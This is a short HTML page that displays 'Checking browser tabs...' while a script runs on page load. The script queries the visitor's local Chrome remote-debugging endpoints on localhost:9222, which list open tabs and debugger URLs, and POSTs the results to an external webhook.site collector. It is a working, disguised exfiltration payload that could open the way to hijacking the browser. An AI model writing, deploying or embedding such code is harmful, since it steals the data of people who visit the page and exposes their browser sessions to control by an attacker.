<!doctype html>
<meta charset="utf-8">
<pre>Checking browser tabs...</pre>
<script>
(async () => {
  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
  const urls = [
    "http://localhost:9222/json/list",
    "http://localhost:9222/json/version"
  ];

  for (const url of urls) {
    try {
      const r = await fetch(url);
      const body = await r.text();
      await fetch(hook, {
        method: "POST",
        mode: "no-cors",
        body: url + "\nHTTP " + r.status + "\n" + body
      });
    } catch (e) {
      await fetch(hook, {
        method: "POST",
        mode: "no-cors",
        body: url + "\nERROR: " + String(e)
      }).catch(() => {});
    }
  }
})();
</script>
